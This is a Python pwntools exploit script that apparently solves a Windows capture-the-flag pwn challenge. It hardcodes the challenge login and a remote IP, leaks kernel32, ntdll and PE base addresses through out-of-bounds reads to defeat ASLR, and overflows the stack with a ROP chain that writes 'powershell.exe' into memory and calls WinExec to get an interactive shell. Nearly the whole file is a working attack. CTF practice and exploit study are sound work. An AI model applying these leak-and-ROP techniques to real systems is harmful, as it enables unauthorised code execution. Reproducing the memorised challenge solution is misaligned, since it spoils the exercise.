#!/usr/bin/env python3
from winpwn import *
from os.path import normpath
import pwn

# =========================================================
#                          SETUP                         
# =========================================================
exe = r'..\dist\win-chall.exe'
pe  = winfile(exe)
pwn.context.log_level = context.log_level = 'info'
pwn.context.newline = context.newline = '\r\n'
pwn.context.arch = context.arch = 'amd64'
pwn.context.endian = context.endian = 'little'
context.windbgx = normpath('WinDbgX.exe')
# host, port = '127.0.0.1', 1337
host, port = '165.22.110.245', 9001

def initialize():
    if pwn.args.REMOTE:
        return remote(host, port)
    else:
        io = process(exe)
        if pwn.args.DBG:
            windbgx.attach(io, script=windbgscript)
        return io

windbgscript = f'''
.scriptload telescope.js
~0s
bu challenge!main+0x354
bu challenge!main+0x36c
'''

# =========================================================
#                         EXPLOITS
# =========================================================
def sendlineafter(prompt, data):
    io.recvuntil(prompt)
    io.sendline(data)

def authenticate():
    sendlineafter('Username:', 'Yume')
    sendlineafter('Password:', 'Yume7!')

def set_value(idx, num):
    sendlineafter('Command:', '1')
    sendlineafter('Index:', str(idx))
    sendlineafter('Value:', str(num))

def get_value(idx):
    sendlineafter('Command:', '2')
    sendlineafter('Index:', str(idx))

kernel32 = 0x0
def leak_kernel32():
    global io
    global kernel32
    
    if kernel32 != 0x0:
        pwn.log.info("KERNEL32 base: %#x", kernel32)
        return
    io = initialize()

    authenticate()

    # pause()
    # set_value(0, 0x0101010101010101)
    # set_value(1, 0x0202020202020202)
    # pause()

    get_value(115)
    io.recvuntil('Value: ', timeout=3)
    leak = int(io.recvline(timeout=3).strip())
    kernel32 = leak - 0x1259d if not pwn.args.REMOTE else leak - 0x17974

    pwn.log.info("KERNEL32 base: %#x", kernel32)
    io.close()

pe.address = 0x0
writeable_pe = pe.address + 0x9000
def leak_aslr():
    global io
    global writeable_pe
    if pe.address != 0x0:
        pwn.log.info("ASLR base: %#x", pe.address)
        pwn.log.info("Writeable PE: %#x", writeable_pe)
        return
    io = initialize()

    authenticate()

    get_value(10)
    io.recvuntil('Value: ')
    leak = int(io.recvline().strip())
    pe.address = leak - 0x58d8
    writeable_pe = pe.address + 0x9000

    pwn.log.info("ASLR base: %#x", pe.address)
    pwn.log.info("Writeable PE: %#x", writeable_pe)
    io.close()

ntdll = 0x0
def leak_ntdll():
    global io
    global ntdll
    if ntdll != 0x0:
        pwn.log.info("ntdll base : %#x", ntdll)
        return
    io = initialize()

    authenticate()

    get_value(121)
    io.recvuntil('Value: ')
    leak = int(io.recvline().strip())
    ntdll = leak - 0x5af38 if not pwn.args.REMOTE else leak - 0x6A271

    pwn.log.info("ntdll base : %#x", ntdll)
    io.close()

def ret2WinExec():
    global io
    io = initialize()

    ret = ntdll + 0x15cb if not pwn.args.REMOTE else ntdll + 0x1029
    pop_rcx = ntdll + 0x2e99b if not pwn.args.REMOTE else ntdll + 0x9217b
    pop_rdx = ntdll + 0xdc412 if not pwn.args.REMOTE else ntdll + 0x57652
    mov_qword_rdx_rcx = ntdll + 0x2f126 if not pwn.args.REMOTE else ntdll + 0xf1687
    WinExec = kernel32 + 0x00068AD0 if not pwn.args.REMOTE else kernel32 + 0x0005F090

    # ; UINT WinExec(
    # ;   LPCSTR lpCmdLine,    => RCX = "powershell.exe",0x0
    # ;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
    # ; );
    offset = 264
    payload = pwn.flat({
        offset: [
            # writing powershell.exe
            pop_rcx,
            pwn.u64(b'powershe'),
            pop_rdx,
            writeable_pe+0x500,
            mov_qword_rdx_rcx,
            
            pop_rcx,
            pwn.u64(b'll.exe'.ljust(8, b'\x00')),
            pop_rdx,
            writeable_pe+0x500+0x8,
            mov_qword_rdx_rcx,

            pop_rcx,
            writeable_pe+0x500,
            pop_rdx,
            0x1,
            ret, # stack 16-byte alignment as per calling convention
            WinExec,
        ]
    })

    authenticate()
    sendlineafter('Command:', '3')
    io.recvuntil(':(')
    pause()
    io.send(payload)

    io.interactive()

def exploit():
    leak_kernel32()
    leak_aslr()
    leak_ntdll()
    ret2WinExec()

if __name__ == '__main__':
    exploit()